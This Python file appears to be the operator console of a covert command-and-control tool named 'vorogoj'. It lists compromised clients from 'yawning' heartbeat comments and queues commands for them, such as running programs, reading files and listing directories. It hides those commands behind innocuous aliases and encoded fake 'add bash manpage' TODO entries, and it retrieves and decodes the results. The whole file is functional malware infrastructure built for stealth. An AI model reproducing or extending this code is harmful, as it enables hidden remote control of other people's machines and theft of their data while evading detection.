from datetime import datetime, timedelta
from json import dumps, loads
from os import kill, getpid
from random import randint
from threading import Thread
from time import sleep
import traceback
from urllib.request import urlopen, Request

from constants import gid, gat
from encoding import decode, encode
from myhttp import get_comments, get_file, update_file

opmap = {
    'w': 'a',
    'cat': 'dog',
    'id': 'ls',
    'ls': 'ping',
    'run': 'man',
}

reverse_opmap = {
    'a': 'w',
    'dog': 'cat',
    'ls': 'id',
    'ping': 'ls',
    'man': 'run',
}

has_args = {
    'w': False,
    'cat': True,
    'id': False,
    'ls': True,
    'run': True,
}

def add_todo(name: str, id: str, task: str, operation: str, args: str = ""):
    old = get_file('TODOs')
    argstr = '' if len(args) == 0 else f' {args}'
    new = f'{old}\n- {id} {name}:' + encode(f' {task}', f'{opmap[operation]}{argstr}')
    if update_file('TODOs', new):
        print(f'Added operation "{operation}" for client "{name}" under id {id}')
    else:
        print("Failed to add operation!")

def delete_todos():
    print('Success? ' + str(update_file('TODOs', 'TODOs\n===\n')))

def print_result(cmd: str, id: str):
    try:
        res = get_file(f'{cmd}-{id}')
    except:
        print("Getting result failed")
        return
    (head, title, ct) = res.split(f'\n\n')
    print('===')
    c, *a = decode(head).split(' ')
    argstr = ' '.join(a)
    print(f'Client command: {reverse_opmap[c]} {argstr}\n')
    print(decode(ct))
    print('===')

def print_help():
    print("""The following controller commands are available:
- c\t\t Instruct a client to run a client command
- d\t\t Delete all commands from TODOs
- h\t\t Show this help text
- i\t\t Set automatic client refresh interval (do not use 0 please)
- l\t\t List clients
- q\t\t Quit
- r\t\t Get a client command result
- u\t\t Update client list""")

def quit():
    if input("Really quit? [y/N]").lower() == 'y':
        print("Goodbye")
        # exit() isn't enough to terminate the background thread
        kill(getpid(), 9)
    else:
        print("Not quitting")

class Controller:
    def __init__(self, auto_refresh: bool):
        self.clients = []
        self.interval = 30
        if auto_refresh:
            Thread(target=self.delayed_update).start()
        self.update()

    def enter_cmd(self):
        i = input("Client to run on: ")
        if not i in self.clients:
            print("Warning: Client may not available (but letting you continue)")
        
        c = input("Client command to run: ")
        if not c in opmap:
            print("Unknown command")
            return
        
        args = ""
        if has_args[c]:
            args = input("Command arguments: ")

        # this should be randomized
        man_name = "bash"

        id = randint(0, 1e8)
        print("Please wait...")
        add_todo(i, id, f'add {man_name} manpage', c, args)

    def eval_cmd(self, cmd):
        match cmd:
            case 'c':
                self.enter_cmd()
            case 'd':
                delete_todos()
            case 'h':
                print_help()
            case 'i':
                try:
                    i = input('New interval (s): ')
                    n = int(i)
                    self.interval = n
                except:
                    print('Something went wrong, interval not changed')
                print(f'Refresh interval is now {self.interval} seconds (change will take place after next refresh)')
            case 'l':
                print("Listing available clients")
                for c in self.clients:
                    print(f' {c}')
            case 'q':
                quit()
            case 'r':
                # this should be randomized (respect the random choice of before)
                print_result('bash', input('id: '))
            case 'u':
                self.update()
            case _:
                print("Unknown command")

    def shell(self):
        print('Welcome to vorogoj v1')
        print('Use the "h" command for help')
        while True:
            try:
                try:
                    cmd = input('>')
                except KeyboardInterrupt:
                    print("^C")
                    quit()
                except EOFError:
                    print("^D")
                    quit()
                self.eval_cmd(cmd)
            except Exception as e:
                print("An exception has occured during execution")
                print(traceback.format_exception(e))
                print("The app is staying up, though")

    def delayed_update(self):
        while(True):
            sleep(self.interval)
            self.update(True)
    
    def update(self, auto = False):
        print("Updating client list... please wait")
        comms = loads(get_comments())
        thresh = datetime.utcnow() - timedelta(minutes=2)
        thresh = thresh.isoformat()
        names = set()
        for c in comms:
            if 'yawning' not in c['body']:
                continue
            if c['created_at'] < thresh:
                # too old
                continue
            names.add(c['body'].split(' ')[0])
        self.clients = list(names)
        if auto:
            print(">", end='', flush=True)

if __name__ == '__main__':
    ctrlr = Controller(True)
    ctrlr.shell()
